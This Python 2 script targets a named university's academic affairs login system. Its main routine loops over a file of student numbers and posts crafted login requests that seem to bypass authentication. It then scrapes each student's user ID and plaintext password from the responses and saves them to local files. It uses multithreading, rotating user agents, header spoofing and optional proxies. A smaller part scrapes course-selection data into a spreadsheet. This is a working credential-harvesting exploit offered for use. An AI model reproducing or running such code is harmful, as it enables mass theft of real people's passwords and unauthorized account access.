# -*- coding: cp936 -*-
import urllib2
import urllib
import HTMLParser  
import urlparse  
import cookielib  
import string  
import re
import time
import math
import os
import json
import xlwt
import sys
import threading
import copy
import random


userAgents = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.75 Safari/537.36',
              'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50',
              'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0;',
              'Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; en) Presto/2.8.131 Version/11.11',
              'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0',
              'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11',
              'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 SE 2.X MetaSr 1.0',
              'Opera/8.0 (Macintosh; PPC Mac OS X; U; en)',
              'Mozilla/5.0 (Windows NT 5.1; rv:44.0) Gecko/20100101 Firefox/44.0',
              'Mozilla/5.0 (Windows; U; Windows NT 5.1) Gecko/20070803 Firefox/1.5.0.12']


proxyList = []





#��¼��ȡ�����õ��߳���
class ThreadForLogin (threading.Thread):
    def __init__(self,name,delay,stuNumber,stuRandom,url):
        super(ThreadForLogin,self).__init__()
        self.delay = delay
        self.name = name
        self.stuNumber = copy.copy(stuNumber)
        self.stuRandom = stuRandom
        self.url = url


    def run(self):
        print 'This is '+self.name
        time.sleep(self.delay)
        for i in self.stuNumber:
            print 'Start '+i+'...'
            opener = passWordOpener(i,self.stuRandom,self.url)

            if saveInfo(opener,self.name,self.url):
                print 'Get '+i+' Success'
            else:
                print 'Get '+i+' Fail'
            pauseSomeTime(i)

#�ӳ�ʱ��
def pauseSomeTime(stuNumber):
    print 'Now is '+stuNumber+'\'s PauseTime'
    time.sleep(3)
    print ''+stuNumber+'\'s PauseTime Over'

#�ӱ��ػ��ѧ��
#����ѧ�Ź��ɵ�List
def getStuNumber():
    f = open("e:\\UserFromSystem\\UserInfo.txt","r")
    lines = f.readlines()
    stuNumberArray = []
    for line in lines:
        stuNumber = line[0:9]
        stuNumberArray.append(stuNumber)

    print 'Get StuNumber From LocalSystem Success'
    f.close()
    return stuNumberArray

#�ӱ����ļ����ȡ���õ�ip����ʽ��
def getIP():
    global proxyList
    f = open('e:\\UserFromSystem\\ip\\ip.txt','r')
    lines = f.readlines()
    for line in lines:
        #print line
        ip = line.split('\t')[0]+':'+line.split('\t')[-1]
        print ip
        proxyList.append({'http':ip})

    print 'Get Match From IP.txt Success'
    f.close()
    

#���ɸ�8λ�������
def getRandom():
    return str(random.randrange(10000000,99999999))

#��ʼ���߳���ȡ����
def getPassWordFromSystem(url):
    Threads = []
    stuNumberArray = div_list(getStuNumber(),3);
    thread1 = ThreadForLogin('Thread1',0,stuNumberArray[0],getRandom(),url)
    thread2 = ThreadForLogin('Thread2',1,stuNumberArray[1],getRandom(),url)
    thread3 = ThreadForLogin('Thread3',2,stuNumberArray[2],getRandom(),url)

    thread1.start()
    thread2.start()
    thread3.start()

    Threads.append(thread1)
    Threads.append(thread2)
    Threads.append(thread3)

    for t in Threads:
        t.join()
    print 'All Thread Has Refuse!Now Main Thread Exit!'

#�ָ�List
def div_list(ls,n):
    if not isinstance(ls,list) or not isinstance(n,int):  
        return []  
    ls_len = len(ls)  
    if n<=0 or 0==ls_len:  
        return []  
    if n > ls_len:  
        return []  
    elif n == ls_len:  
        return [[i] for i in ls]  
    else:  
        j = ls_len/n  
        k = ls_len%n  
        ### j,j,j,...(ǰ����n-1��j),j+k  
        #����j,����n-1  
        ls_return = []  
        for i in xrange(0,(n-1)*j,j):  
            ls_return.append(ls[i:i+j])  
        #����ĩβ��j+k  
        ls_return.append(ls[(n-1)*j:])  
        return ls_return


#�����½
#�ú�����϶�̫��
def loginToSys(code,now):
    #��¼����ҳ��  
    #hosturl = 'http://jwxt.gduf.edu.cn' 
    #post���ݽ��պʹ����ҳ��  
    posturl = 'http://jwxt.gduf.edu.cn/jsxsd/xk/LoginToXk' 
      
    #����һ��cookie��������������ӷ���������cookie�����أ������ڷ�������ʱ���ϱ��ص�cookie  
    cj = cookielib.CookieJar()  
    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj), urllib2.HTTPHandler)
    # ����ͷ�ļ�αװ�����
    opener.adddeaders = [('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.75 Safari/537.36'),
                         ('Referer' , 'http://jwxt.gduf.edu.cn/jsxsd/')]
    #���������
    #Inp(ѧ��)+%%%+Inp(����)
    postData = {'encoded':code}
    #����POST����
    postData = urllib.urlencode(postData)
    #����ҳPOST���ݲ�Я��cookie
    op = opener.open(posturl,postData)
    print op.read()
    print 'Login to System Success'
    
    #ץȡ�������˺�����
    #saveInfo(opener)

    
    #ѡ�� 
    ccUrl = getClassChooseUrl(opener)
    #print ccUrl
    #if goToChooseClass(opener,ccUrl):
    #    opener.open('http://jwxt.gduf.edu.cn/jsxsd/xsxkkc/comeInGgxxkxk')
    #    ccJsonParse(poToUrl(opener,1),now)
    #return data

#ץȡģ���¼ ���ص���opener
def passWordOpener(stuNumber,ticket,url):
    global userAgent
    #218.107.50.221
    #218.107.50.218
    if url.strip()=='':
    	url='jwxt.gduf.edu.cn'
    posturl = 'http://'+url+'/Logon.do?method=logonFromJsxsd' 

    #�Ӵ���IP�б������ѡһ����Ϊ����IP
    #proxyListΪһ�� **ȫ��List
    #proxyIP = random.choice(proxyList)
    #����һ��cookie��������������ӷ���������cookie�����أ������ڷ�������ʱ���ϱ��ص�cookie  
    cj = cookielib.CookieJar()  
    #�������userAgents�б������ѡȡһ����Ϊ�����UA
    ua_temp = random.choice(userAgents)
    #�Դ���IP��Cookie����������һ��opener
    #urllib2.ProxyHandler(proxyIP),
    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj), urllib2.HTTPHandler)
    # ����ͷ�ļ�αװ�����
    opener.addheaders = [('User-Agent', ua_temp),
                         ('Referer' , 'http://'+url+'/jsxsd/'),
                         ('Accept','text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'),
                         ('Accept-Encoding','gzip, deflate, sdch'),
                         ('Accept-Language','zh-CN,zh;q=0.8')]

    
    #���������
    postData = {'view':'',
                'useraccount':stuNumber,
                'ticket':stuNumber+'#'+ticket}
    #����POST����
    postData = urllib.urlencode(postData)
    #����ҳPOST���ݲ�Я��cookie
    response = opener.open(posturl,postData)
    return response


#��ȡѡ������
def getClassChooseUrl(opener):
    op = opener.open('http://jwxt.gduf.edu.cn/jsxsd/xsxk/xklc_list')
    data = op.read()
    #����ɸѡ������
    pattern = re.compile(r'<a href="(.+?)">',re.S)
    ccUrl = re.findall(pattern,data)
    #������һ������ Ҳ���ǽ���ѡ�ε�����
    #�Զ����׺ƥ��
    return ccUrl[len(ccUrl)-1]+'_fuckyou'


#����������תѡ��ҳ��
def goToChooseClass(opener,ccUrl):
    pattern = re.compile(r'\/jsxsd\/xsxk\/xklc_view\?jx0502zbid=(.+?)_fuckyou',re.S)
    url = re.findall(pattern,ccUrl)
    print url
    if len(url):   
        op = opener.open('http://jwxt.gduf.edu.cn/jsxsd/xsxk/xsxk_index?jx0502zbid='+url[0])
        #data = op.read()
        print 'success'
        return True
    else:
        print 'fail'
        return False



#�����ʺ�����
#������ӵ�и�ѧ�ŵ�¼��cookie��opener���߳����
#���߳���������ļ��������߳���
def saveInfo(response,threadNumber,url):
    #if url.strip()=='':
    #    url = 'jwxt.gduf.edu.cn'
    data = response.read()
    #print response.info()
    #print data
    
    if not os.path.exists('e:/UserFromSystem/'):
        os.mkdir(r'e:/UserFromSystem/')

    f = open("e:\\UserFromSystem\\PassWordInfo"+threadNumber+".txt","a+")
        
    if data.strip()=='':
        f.close()
        print 'Log to System Fail'
        return False
    else:
        userid = getUserId(data)
        userpwd = getPassWord(data)
        if not (userid.strip()=='' and userpwd.strip()==''):
            f.write(userid)
            f.write('    ')
            f.write(userpwd)
            f.write('\n')
            f.close()
            print "Get "+userid+" Save Success"
            return True
        else:
            print 'Get '+userid+' Fail'
            f.close()
            return False
    
            

#��ȡ����
def getPassWord(data):
    #print data
    pattern = re.compile(r"var userpsw = '(.+?)';",re.S)
    userpwd = re.findall(pattern,data)
    
    #print userpwd[0]
    
    if userpwd:
        return userpwd[0]
    else:
        return ''

#��ȡ�˺�
def getUserId(data):
    pattern = re.compile(r"var userid = '(.+?)';",re.S)
    userid = re.findall(pattern,data)

    if userid:
        return userid[0]
    else:
        return ''


#�˺�������뺯��
def encodeInp(input):
    keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
    output = ""
    chr1, chr2, chr3 = "","",""
    enc1, enc2, enc3, enc4 = "","","",""
    i = 0
    while True:
        if i<len(input):
            chr1 = ord(input[i])
            i+=1
        if i<len(input):
            chr2 = ord(input[i])
            i+=1
        if i<len(input):   
            chr3 = ord(input[i])
            i+=1

        enc1 = chr1 >> 2
        
        if not chr2=='':
            enc2 = ((chr1 & 3) << 4) | (chr2 >> 4)
        else:
            enc2 = ((chr1 & 3) << 4)

        if not chr2=='':
            if not chr3=='':
                enc3 = ((chr2 & 15) << 2) | (chr3 >> 6)
                enc4 = chr3 & 63
            else:
                enc3 = ((chr2 & 15) << 2)
                
        if not chr2=='':
            if math.isnan(chr2):
                enc3 = enc4 = 64
        else:
            enc3 = enc4 = 64
        if not chr3=='':
            if math.isnan(chr3):
                enc4 = 64
        else:
            enc4 = 64
        output = output + chr(ord(keyStr[enc1])) + chr(ord(keyStr[enc2])) + chr(ord(keyStr[enc3])) + chr(ord(keyStr[enc4]))
        chr1 = chr2 = chr3 = ""
        enc1 = enc2 = enc3 = enc4 = ""
        if i >= len(input):
            break
    return output


#��γ�
#����Json
def poToUrl(opener,echo):
    #����һ��Ҫ�ύ����������(�ֵ�)
    data = {}
    data['sEcho'] = echo
    data['iColumns'] = '12'
    data['sColumns'] = ''
    data['iDisplayStart'] = 0
    data['iDisplayLength'] = 177
    data['mDataProp_0'] = 'kch'
    data['mDataProp_1'] = 'kcmc'
    data['mDataProp_2'] = 'xf'
    data['mDataProp_3'] = 'skls'
    data['mDataProp_4'] = 'sksj'
    data['mDataProp_5'] = 'skdd'
    data['mDataProp_6'] = 'xqmc'
    data['mDataProp_7'] = 'xkrs'
    data['mDataProp_8'] = 'syrs'
    data['mDataProp_9'] = 'ctsm'
    data['mDataProp_10'] = 'szkcflmc'
    data['mDataProp_11'] = 'czOper'

     
    #����post�ĵ�ַ
    url = 'http://jwxt.gduf.edu.cn/jsxsd/xsxkkc/xsxkGgxxkxk?kcxx=&skls=&skxq=&skjc=&sfym=false&sfct=false&szjylb=&sfxx=false'
    post_data = urllib.urlencode(data)
     
    #�ύ����������
    req = opener.open(url, post_data)
     
    #��ȡ�ύ�󷵻ص���Ϣ
    content = req.read()
    classInfoJson = json.loads(content)
    #�ᱬջ
    #print classInfoJson
    return classInfoJson

#����γ���Ϣ
#����ΪPOST�γ�����󷵻ص�JSON,������ļ�����
def ccJsonParse(json,now):
    if not os.path.exists('e:/ClassData/'):
        os.mkdir(r'e:/ClassData/')
    if os.path.exists('e:/ClassData/'+now+'.xls'):
        os.remove('e:/ClassData/'+now+'.xls')
    kch = '�γ̺�'
    jx0404id = 'jx0404id'
    skls = '�Ͽ���ʦ'
    sksj = '�Ͽ�ʱ��'
    skdd = '�Ͽεص�'
    kcmc = '�γ�����'
    cfbs = 'δ֪Ҫ��-cfbs-null'
    xf = 'ѧ��'
    syrs = 'ʣ������'
    book = xlwt.Workbook(encoding='utf-8',style_compression=0)
    sheet = book.add_sheet('ClassInfo1',cell_overwrite_ok=True)
    
    sheet.write(0,0,kch.decode('gbk'))
    sheet.write(0,1,jx0404id.decode('gbk'))
    sheet.write(0,2,cfbs.decode('gbk'))
    sheet.write(0,3,xf.decode('gbk'))
    sheet.write(0,4,kcmc.decode('gbk'))
    sheet.write(0,5,skls.decode('gbk'))
    sheet.write(0,6,skdd.decode('gbk'))
    sheet.write(0,7,sksj.decode('gbk'))
    sheet.write(0,8,syrs.decode('gbk'))

    for i in range(0,json['iTotalRecords']):
        sheet.write(i+1,0,json['aaData'][i]['kch'])
        sheet.write(i+1,1,json['aaData'][i]['jx0404id'])
        sheet.write(i+1,2,'null')
        sheet.write(i+1,3,json['aaData'][i]['xf'])
        sheet.write(i+1,4,json['aaData'][i]['kcmc'])
        sheet.write(i+1,5,json['aaData'][i]['skls'])
        sheet.write(i+1,6,json['aaData'][i]['skdd'])
        sheet.write(i+1,7,json['aaData'][i]['sksj'])
        sheet.write(i+1,8,json['aaData'][i]['syrs'])

    book.save('e:\\ClassData\\'+now+'.xls')
    print 'Save ClassData Success'

def JustForTest():
    posturl = 'http://jwxt.gduf.edu.cn/Logon.do?method=logonFromJsxsd' 

    #�Ӵ���IP�б������ѡһ����Ϊ����IP
    #proxyListΪһ�� **ȫ��List
    #proxyIP = random.choice(proxyList)
    #����һ��cookie��������������ӷ���������cookie�����أ������ڷ�������ʱ���ϱ��ص�cookie  
    cj = cookielib.CookieJar()
    #�������userAgents�б������ѡȡһ����Ϊ�����UA
    ua_temp = random.choice(userAgents)
    #�Դ���IP��Cookie����������һ��opener
    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj), urllib2.HTTPHandler)
    # ����ͷ�ļ�αװ�����
    opener.addheaders = [('User-Agent', ua_temp),
                         ('Referer' , 'http://jwxt.gduf.edu.cn/jsxsd/'),
                         ('Accept','text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'),
                         ('Accept-Encoding','gzip, deflate, sdch'),
                         ('Accept-Language','zh-CN,zh;q=0.8'),
                         ('Connection','Keep-alive')]

    
    #���������
    postData = {'view':'',
                'useraccount':'151543215',
                'ticket':'151543215'+'#'+'fuck_off'}
    #����POST����
    postData = urllib.urlencode(postData)
    #����ҳPOST���ݲ�Я��cookie
    response = opener.open(posturl,postData)
    data = response.read()
    print data


if __name__ == "__main__":
    #getIP()
    #print 'Get IP Success'
    #time.sleep(2)
    getPassWordFromSystem('')
    #JustForTest()
    print 'main success'
